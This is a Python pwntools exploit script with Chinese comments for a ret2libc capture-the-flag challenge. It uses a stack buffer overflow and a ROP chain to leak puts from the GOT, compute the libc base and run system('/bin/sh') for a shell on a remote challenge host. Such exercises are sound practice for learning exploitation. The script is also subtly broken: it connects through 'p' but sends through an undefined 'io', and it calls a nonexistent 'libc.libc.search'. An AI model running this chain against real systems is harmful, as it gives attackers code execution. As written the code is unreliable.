# 导入pwntools库，用于漏洞利用开发
from pwn import *
# 导入LibcSearcher库，用于查找libc版本
from LibcSearcher import *

# 设置运行环境：调试模式、Linux系统、64位架构
context(log_level='debug', os='linux', arch='amd64')

# 定义目标程序路径
pwnfile = './ret2libc_1'
# 启动目标程序进程
p=remote("node5.buuoj.cn",29396)
# 创建ELF对象，用于解析目标程序
elf = ELF(pwnfile)

# 计算溢出所需的填充长度（覆盖栈空间到返回地址）
pad = 0xd0 + 8
# 获取puts函数的GOT表地址（动态链接的实际地址）
puts_got = elf.got['puts']
# 获取puts函数的PLT表地址（程序链接表）
puts_plt = elf.plt['puts']
# 获取main函数的起始地址（用于二次利用）
main_adr = elf.symbols['main']

# 定义ROP gadget：pop rdi; ret（用于传递第一个参数）
pop_rdi = 0x0400963
# 构造第一次payload：覆盖返回地址后执行puts(puts_got)
pay = b'a' * pad + p64(pop_rdi) + p64(puts_got)
pay += p64(puts_plt) + p64(main_adr)  # 调用puts后返回main函数

# 发送payload（在收到"Please tell me:"提示后）
io.sendlineafter("Please tell me:", pay)
# 接收puts函数实际地址（读取直到遇到\x7f字符，这是地址的高位特征）
puts_adr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print("puts_adr-->", hex(puts_adr))  # 打印puts函数实际地址

# 加载本地libc库（用于计算偏移）
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# 计算libc基地址 = puts实际地址 - puts在libc中的偏移
libc_base = puts_adr - libc.sym['puts']
# 计算system函数实际地址
sys_adr = libc_base + libc.sym['system']
# 在libc中搜索"/bin/sh"字符串地址
bin_sh = libc_base + libc.libc.search(b'/bin/sh').__next__()

# 构造第二次payload：执行system("/bin/sh")
pay1 = b'a' * pad + p64(pop_rdi) + p64(bin_sh)  # 设置第一个参数为/bin/sh
pay1 += p64(pop_rdi + 1) + p64(sys_adr)  # 调用system（pop_rdi+1是为了栈对齐）

# 发送第二次payload
io.sendlineafter("Please tell me:", pay1)

# 切换到交互模式（获取shell后与用户交互）
io.interactive()